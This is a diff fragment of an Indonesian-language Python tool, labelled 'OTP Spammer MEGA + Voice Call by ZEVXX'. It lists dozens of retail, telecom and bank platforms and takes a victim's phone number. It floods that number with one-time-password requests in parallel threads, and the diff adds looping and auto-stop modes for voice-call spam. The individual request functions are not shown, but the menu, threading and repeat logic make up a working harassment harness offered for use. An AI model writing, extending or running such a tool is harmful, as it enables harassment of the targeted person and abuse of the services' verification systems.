+    ("Hijup (Resend)", spam_hijup_resend, "plus"),
+    ("Bhinneka (Resend)", spam_bhinneka_resend, "plus"),
+    ("Sephora (Resend)", spam_sephora_resend, "plus"),
+    ("Guardian (Resend)", spam_guardian_resend, "plus"),
+    ("Century (Resend)", spam_century_resend, "plus"),
+    ("Adidas (Resend)", spam_adidas_resend, "plus"),
+    ("Nike (Resend)", spam_nike_resend, "plus"),
+    ("Uniqlo (Resend)", spam_uniqlo_resend, "plus"),
+    ("H&M (Resend)", spam_hm_resend, "plus"),
+    ("Zara (Resend)", spam_zara_resend, "plus"),
+    ("Cotton On (Resend)", spam_cottonon_resend, "plus"),
+    ("Lotus (Resend)", spam_lotus_resend, "plus"),
+    ("Ralali (Resend)", spam_ralali_resend, "plus"),
+    ("Distributor (Resend)", spam_distributor_resend, "plus"),
+    ("MNC Play (Resend)", spam_mncplay_resend, "plus"),
+    ("MyRepublic (Resend)", spam_myrepublic_resend, "plus"),
+    ("Biznet (Resend)", spam_biznet_resend, "plus"),
+    ("First Media (Resend)", spam_firstmedia_resend, "plus"),
+    ("Oxygen (Resend)", spam_oxygen_resend, "plus"),
+    ("CBN (Resend)", spam_cbn_resend, "plus"),
+    ("XL Home (Resend)", spam_xlhome_resend, "plus"),
+    ("Smartfren (Resend)", spam_smartfren_resend, "plus"),
+    ("IM3 (Resend)", spam_im3_resend, "plus"),
+    ("Axis (Resend)", spam_axis_resend, "plus"),
+    ("Tri (Resend)", spam_tri_resend, "plus"),
+    ("By.U (Resend)", spam_byu_resend, "plus"),
+    ("BTN (Resend)", spam_btn_resend2, "08"),
+    ("BJB (Resend)", spam_bjb_resend2, "08"),
+    ("Bank Jatim (Resend)", spam_bankjatim_resend, "08"),
+    ("Bank Sulsel (Resend)", spam_banksulsel_resend, "08"),
+    ("Bank Sumut (Resend)", spam_banksumut_resend, "08"),
+    ("Bank Kaltim (Resend)", spam_bankkaltim_resend, "08"),
+    ("Bank Papua (Resend)", spam_bankpapua_resend, "08"),
+    ("Bank Maluku (Resend)", spam_bankmaluku_resend, "08"),
 ]
 
 # ============================================================
-# SPAM ALL
+# SPAM ALL (OTP)
 # ============================================================
 def spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int):
     serangan_mulai()
@@ -5173,6 +5386,7 @@ def spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int):
     print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}\n")
     loading("Mengirim OTP", 0.8)
     success_count = 0
+
     def run_platform(name, func, format_type):
         if format_type == "08":
             phone = phone_08
@@ -5192,6 +5406,7 @@ def spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int):
             return name, success, msg
         except:
             return name, False, "Error"
+
     with ThreadPoolExecutor(max_workers=20) as executor:
         futures = {executor.submit(run_platform, name, func, fmt): (name, fmt) for name, func, fmt in PLATFORMS}
         for future in as_completed(futures):
@@ -5204,6 +5419,7 @@ def spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int):
                     print(f"  {Color.YELLOW}⚠️ {Color.RESET} {name:<16}  {Color.YELLOW}→ {msg}{Color.RESET}")
                 else:
                     print(f"  {Color.RED}❌{Color.RESET} {name:<16}  {Color.RED}→ {msg}{Color.RESET}")
+
     print(f"\n{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
     print(f"{Color.GOLD}│ {Color.BOLD}📊 HASIL:{Color.RESET} {Color.GREEN}{success_count}{Color.RESET}/{Color.WHITE}{len(PLATFORMS)}{Color.RESET} SUKSES  {Color.DIM}• {datetime.now().strftime('%H:%M:%S')}{Color.GOLD}  │{Color.RESET}")
     print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}")
@@ -5215,7 +5431,7 @@ def spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int):
 def main():
     welcome_screen()
     print(f"{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
-    print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}📱 OTP Spammer MEGA{Color.RESET}  {Color.DIM}• {len(PLATFORMS)} Platform • by ZEVXX{Color.GOLD}  │{Color.RESET}")
+    print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}📱 OTP Spammer MEGA + Voice Call{Color.RESET}  {Color.DIM}• {len(PLATFORMS)} OTP + {len(VOICE_PLATFORMS)} Voice • by ZEVXX{Color.GOLD}  │{Color.RESET}")
     print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}")
     phone = input(f"\n{Color.NEON}┌─ {Color.BOLD}📞 Nomor HP{Color.RESET}\n{Color.NEON}└──➤ {Color.RESET}").strip()
     if not phone:
@@ -5236,13 +5452,17 @@ def main():
     print(f"\n{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
     print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}🎯 MENU{Color.RESET}{Color.GOLD}                                                 │{Color.RESET}")
     print(f"{Color.GOLD}├────────────────────────────────────────────────────────────┤{Color.RESET}")
-    print(f"{Color.GOLD}│  {Color.GREEN}1.{Color.RESET}  🚀 SPAM PARALLEL       {Color.DIM}→ Semua platform{Color.GOLD}                 │{Color.RESET}")
+    print(f"{Color.GOLD}│  {Color.GREEN}1.{Color.RESET}  🚀 SPAM PARALLEL       {Color.DIM}→ Semua platform OTP{Color.GOLD}                │{Color.RESET}")
     print(f"{Color.GOLD}│  {Color.GREEN}2.{Color.RESET}  🔄 SPAM LOOP           {Color.DIM}→ Terus menerus (jeda 120s){Color.GOLD}      │{Color.RESET}")
     print(f"{Color.GOLD}│  {Color.GREEN}3.{Color.RESET}  🛑 SPAM + AUTO STOP    {Color.DIM}→ Stop 5+ sukses{Color.GOLD}                │{Color.RESET}")
-    print(f"{Color.GOLD}│  {Color.GREEN}4.{Color.RESET}  📋 LIST PLATFORM       {Color.DIM}→ Lihat semua{Color.GOLD}                    │{Color.RESET}")
-    print(f"{Color.GOLD}│  {Color.GREEN}5.{Color.RESET}  ❌ EXIT                {Color.DIM}→ Keluar{Color.GOLD}                         │{Color.RESET}")
+    print(f"{Color.GOLD}│  {Color.GREEN}4.{Color.RESET}  📋 LIST PLATFORM       {Color.DIM}→ Lihat semua OTP{Color.GOLD}               │{Color.RESET}")
+    print(f"{Color.GOLD}│  {Color.GREEN}5.{Color.RESET}  📞 SPAM CALL           {Color.DIM}→ Panggilan suara OTP{Color.GOLD}            │{Color.RESET}")
+    print(f"{Color.GOLD}│  {Color.GREEN}6.{Color.RESET}  🔄 SPAM CALL LOOP      {Color.DIM}→ Terus menerus (jeda 120s){Color.GOLD}      │{Color.RESET}")
+    print(f"{Color.GOLD}│  {Color.GREEN}7.{Color.RESET}  🛑 SPAM CALL AUTO STOP {Color.DIM}→ Stop 5+ sukses{Color.GOLD}                │{Color.RESET}")
+    print(f"{Color.GOLD}│  {Color.GREEN}8.{Color.RESET}  ❌ EXIT                {Color.DIM}→ Keluar{Color.GOLD}                         │{Color.RESET}")
     print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}")
-    mode = input(f"\n{Color.NEON}┌─ {Color.BOLD}🔹 Pilih (1-5){Color.RESET}\n{Color.NEON}└──➤ {Color.RESET}").strip()
+    mode = input(f"\n{Color.NEON}┌─ {Color.BOLD}🔹 Pilih (1-8){Color.RESET}\n{Color.NEON}└──➤ {Color.RESET}").strip()
+
     if mode == "1":
         spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int)
     elif mode == "2":
@@ -5267,8 +5487,7 @@ def main():
             sys.exit(0)
     elif mode == "3":
         target = 5
-        print(f"\n{Color.YELLOW}┌─ {Color.BOLD}🛑 AUTO STOP{Color.RESET}")
-        print(f"{Color.YELLOW}│  Stop setelah {Color.GREEN}{target}{Color.YELLOW} sukses{Color.RESET}")
+        print(f"\n{Color.YELLOW}┌─ {Color.BOLD}🛑 AUTO STOP OTP (target {target}){Color.RESET}")
         print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
         total = 0
         round_num = 0
@@ -5295,7 +5514,7 @@ def main():
             sys.exit(0)
     elif mode == "4":
         print(f"\n{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
-        print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}📋 LIST PLATFORM ({len(PLATFORMS)}){Color.RESET}{Color.GOLD}                          │{Color.RESET}")
+        print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}📋 LIST PLATFORM OTP ({len(PLATFORMS)}){Color.RESET}{Color.GOLD}                      │{Color.RESET}")
         print(f"{Color.GOLD}├────────────────────────────────────────────────────────────┤{Color.RESET}")
         for i, (name, _, fmt) in enumerate(PLATFORMS, 1):
             icon = "📱" if fmt == "08" else "🌐" if fmt == "62" else "📞" if fmt == "plus" else "🔢"
@@ -5303,12 +5522,58 @@ def main():
         print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}")
         input(f"\n{Color.DIM}Enter untuk kembali...{Color.RESET}")
     elif mode == "5":
-        print(f"\n{Color.YELLOW}┌─ [!] Keluar{Color.RESET}")
+        spam_call_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int)
+    elif mode == "6":
+        print(f"\n{Color.YELLOW}┌─ {Color.BOLD}🔄 LOOP SPAM CALL (JEDA 120 DETIK){Color.RESET}")
+        print(f"{Color.YELLOW}│  Tekan {Color.RED}Ctrl+C{Color.YELLOW} untuk berhenti{Color.RESET}")
         print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
-        sys.exit(0)
+        try:
+            round_num = 0
+            while True:
+                round_num += 1
+                print(f"\n{Color.NEON}┌─ {Color.BOLD}📌 ROUND CALL {round_num}{Color.RESET}")
+                print(f"{Color.NEON}└────────────────────────────────────────────────────────────{Color.RESET}")
+                spam_call_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int)
+                print(f"\n{Color.YELLOW}⏳ Jeda 120 detik...{Color.RESET}")
+                for i in range(120, 0, -1):
+                    print(f"\r  {Color.YELLOW}⏳ {i:>3} detik...{Color.RESET}", end="")
+                    time.sleep(1)
+                print()
+        except KeyboardInterrupt:
+            print(f"\n{Color.YELLOW}┌─ [!] Dihentikan{Color.RESET}")
+            print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
+            sys.exit(0)
+    elif mode == "7":
+        target = 5
+        print(f"\n{Color.YELLOW}┌─ {Color.BOLD}🛑 AUTO STOP SPAM CALL (target {target}){Color.RESET}")
+        print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
+        total = 0
+        round_num = 0
+        try:
+            while total < target:
+                round_num += 1
+                print(f"\n{Color.NEON}┌─ {Color.BOLD}📌 ROUND CALL {round_num}{Color.RESET}  {Color.DIM}• {total}/{target}{Color.RESET}")
+                print(f"{Color.NEON}└────────────────────────────────────────────────────────────{Color.RESET}")
+                success = spam_call_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int)
+                total += success
+                if total >= target:
+                    print(f"\n{Color.GREEN}┌─ {Color.BOLD}✅ TARGET TERCAPAI!{Color.RESET}")
+                    print(f"{Color.GREEN}│  Total sukses call: {total}{Color.RESET}")
+                    print(f"{Color.GREEN}└────────────────────────────────────────────────────────────{Color.RESET}")
+                    break
+                print(f"\n{Color.YELLOW}⏳ Jeda 60 detik...{Color.RESET}")
+                for i in range(60, 0, -1):
+                    print(f"\r  {Color.YELLOW}⏳ {i:>3} detik...{Color.RESET}", end="")
+                    time.sleep(1)
+                print()
+        except KeyboardInterrupt:
+            print(f"\n{Color.YELLOW}┌─ [!] Dihentikan{Color.RESET}")
+            print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
+            sys.exit(0)
     else:
         print(f"{Color.RED}┌─ [!] Pilihan tidak valid!{Color.RESET}")
         print(f"{Color.RED}└────────────────────────────────────────────────────────────{Color.RESET}")
+
     print()
     input(f"{Color.DIM}Enter untuk kembali...{Color.RESET}")
 
